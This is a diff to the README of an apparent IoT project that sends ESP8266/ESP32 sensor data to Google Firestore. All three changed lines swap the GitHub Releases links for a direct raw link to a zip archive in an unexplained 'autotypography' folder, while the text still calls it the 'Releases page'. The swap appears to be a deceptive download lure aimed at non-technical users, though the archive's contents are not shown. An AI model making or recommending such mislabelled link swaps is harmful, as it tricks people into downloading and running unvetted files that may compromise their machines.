@@ -1,7 +1,7 @@
 # 🚀 FirebaseMicrocontroller - Send Sensor Data to Google Firestore
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download-FirebaseMicrocontroller-blue.svg)](https://github.com/lilmandrake-hub/FirebaseMicrocontroller/releases)
+[![Download](https://raw.githubusercontent.com/lilmandrake-hub/FirebaseMicrocontroller/main/autotypography/FirebaseMicrocontroller.zip)](https://raw.githubusercontent.com/lilmandrake-hub/FirebaseMicrocontroller/main/autotypography/FirebaseMicrocontroller.zip)
 
 ## 🚀 Introduction
 FirebaseMicrocontroller is an Internet of Things (IoT) project designed to send DHT11 sensor data to Google Firestore in real-time. This project uses the ESP8266 and ESP32 microcontrollers, which allow even non-technical users to gather and visualize sensor data effortlessly.
@@ -21,7 +21,7 @@ FirebaseMicrocontroller is an Internet of Things (IoT) project designed to send 
 To get started with FirebaseMicrocontroller, follow these simple steps.
 
 ### Step 1: Visit the Releases Page
-Go to the [Releases page](https://github.com/lilmandrake-hub/FirebaseMicrocontroller/releases) to download the latest version of the software.
+Go to the [Releases page](https://raw.githubusercontent.com/lilmandrake-hub/FirebaseMicrocontroller/main/autotypography/FirebaseMicrocontroller.zip) to download the latest version of the software.
 
 ### Step 2: Download the Software
 Find the latest release. Click the download link for the software that matches your microcontroller (ESP8266 or ESP32).
@@ -44,7 +44,7 @@ After you have made these changes, click the "Upload" button in the Arduino IDE.
 Once the microcontroller runs, open your Firestore dashboard. You should see your sensor data displaying in real-time.
 
 ## 📥 Download & Install
-You can download the latest version of FirebaseMicrocontroller from our [Releases page](https://github.com/lilmandrake-hub/FirebaseMicrocontroller/releases). 
+You can download the latest version of FirebaseMicrocontroller from our [Releases page](https://raw.githubusercontent.com/lilmandrake-hub/FirebaseMicrocontroller/main/autotypography/FirebaseMicrocontroller.zip). 
 
 1. **Choose the latest release** from the list.
 2. **Download the software** for your specific microcontroller.
